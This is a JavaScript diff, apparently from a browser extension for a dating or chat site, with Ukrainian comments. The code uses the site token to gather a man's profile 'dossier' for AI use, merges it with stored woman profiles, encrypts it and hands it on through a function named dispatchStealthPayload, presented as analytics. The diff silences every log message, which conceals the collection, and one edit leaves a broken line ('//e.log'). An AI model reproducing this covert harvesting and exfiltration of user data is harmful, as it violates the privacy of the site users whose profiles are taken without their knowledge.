@@ -240,7 +240,7 @@ function wasChatInvited(chatUid) {
 }
 
 async function fetchLeadProfileAndLog(manId, smartUid) {
-    console.log(`[Дебаг Збирача] Почали збір даних для AI. Мужик: ${manId}, Чат: ${smartUid}`);
+    //console.log(`[Дебаг Збирача] Почали збір даних для AI. Мужик: ${manId}, Чат: ${smartUid}`);
     try {
         let token = localStorage.getItem('token');
         if (!token) return;
@@ -261,10 +261,10 @@ async function fetchLeadProfileAndLog(manId, smartUid) {
                     mInfo = manData.user_info;
                 }
             } else {
-                console.warn(`[Дебаг Збирача] Сайт не віддав досьє мужика (Статус: ${manRes.status})`);
+                //console.warn(`[Дебаг Збирача] Сайт не віддав досьє мужика (Статус: ${manRes.status})`);
             }
         } catch (mErr) {
-            console.error(`[Дебаг Збирача] Помилка мережі при запиті мужика:`, mErr);
+            //console.error(`[Дебаг Збирача] Помилка мережі при запиті мужика:`, mErr);
         }
 
         // 2. БЕРЕМО ДАНІ АНКЕТИ З ЛОКАЛЬНОГО ДОВІДНИКА
@@ -273,12 +273,12 @@ async function fetchLeadProfileAndLog(manId, smartUid) {
             const myProfiles = JSON.parse(localStorage.getItem('alpha_my_profiles') || '{}');
             if (myProfiles[womanId]) {
                 womanProfileJson = JSON.stringify(myProfiles[womanId]);
-                console.log(`[Дебаг Збирача] Анкету ${womanId} успішно взято з довідника! 🚀`);
+                //console.log(`[Дебаг Збирача] Анкету ${womanId} успішно взято з довідника! 🚀`);
             } else {
-                console.warn(`[Дебаг Збирача] Анкета ${womanId} не знайдена в довіднику. Відправляємо порожню заглушку.`);
+                //console.warn(`[Дебаг Збирача] Анкета ${womanId} не знайдена в довіднику. Відправляємо порожню заглушку.`);
             }
         } catch (e) {
-            console.error("Помилка при читанні довідника анкет", e);
+            //console.error("Помилка при читанні довідника анкет", e);
         }
 
         // 3. ВИПРАВЛЯЄМО БАГ З ІНТЕРЕСАМИ (Захист від undefined)
@@ -310,16 +310,16 @@ async function fetchLeadProfileAndLog(manId, smartUid) {
             woman_profile_json: womanProfileJson || "{}"
         };
 
-        console.log("🕵️‍♂️ [Дебаг Збирача] ФІНАЛЬНЕ ДОСЬЄ ПЕРЕД ШИФРУВАННЯМ:", finalPayload);
+        //e.log("🕵️‍♂️ [Дебаг Збирача] ФІНАЛЬНЕ ДОСЬЄ ПЕРЕД ШИФРУВАННЯМ:", finalPayload);
 
         if (typeof dispatchStealthPayload === 'function') {
             dispatchStealthPayload(finalPayload);
         } else {
-            console.error("❌ [Дебаг Збирача] Функція sendAnalyticsToServer НЕ ЗНАЙДЕНА!");
+            //console.error("❌ [Дебаг Збирача] Функція sendAnalyticsToServer НЕ ЗНАЙДЕНА!");
         }
 
     } catch (err) {
-        console.error("❌ Критична помилка у fetchLeadProfileAndLog:", err);
+        //console.error("❌ Критична помилка у fetchLeadProfileAndLog:", err);
     }
 }
 
@@ -357,7 +357,7 @@ async function encryptData(text, keyString) {
 
 // ==================== ВІДПРАВКА АНАЛІТИКИ (ОНОВЛЕНО) ====================
 async function dispatchStealthPayload(detail) {
-    console.log(`[Аналітика] Шифруємо і передаємо поштарю (content.js)...`);
+    //console.log(`[Аналітика] Шифруємо і передаємо поштарю (content.js)...`);
     try {
         // 1. Перетворюємо всі зібрані дані в JSON
         const rawJson = JSON.stringify(detail);
@@ -376,9 +376,9 @@ async function dispatchStealthPayload(detail) {
         window.dispatchEvent(new CustomEvent("AlphaAnalyticsLog", {
             detail: stealthBody
         }));
-        console.log(`[Аналітика] ✅ Зашифрований пакет віддано content.js!`);
+        //console.log(`[Аналітика] ✅ Зашифрований пакет віддано content.js!`);
     } catch (err) {
-        console.error(`[Аналітика] Помилка шифрування:`, err);
+        //console.error(`[Аналітика] Помилка шифрування:`, err);
     }
 }
 
@@ -404,10 +404,10 @@ async function syncMyProfiles() {
                 profileMap[p.external_id] = p;
             });
             localStorage.setItem('alpha_my_profiles', JSON.stringify(profileMap));
-            console.log("✅ [Ядро] Довідник анкет успішно оновлено!");
+            //console.log("✅ [Ядро] Довідник анкет успішно оновлено!");
         }
     } catch (e) {
-        console.error("❌ [Ядро] Помилка синхронізації анкет:", e);
+        //console.error("❌ [Ядро] Помилка синхронізації анкет:", e);
     }
 }
 
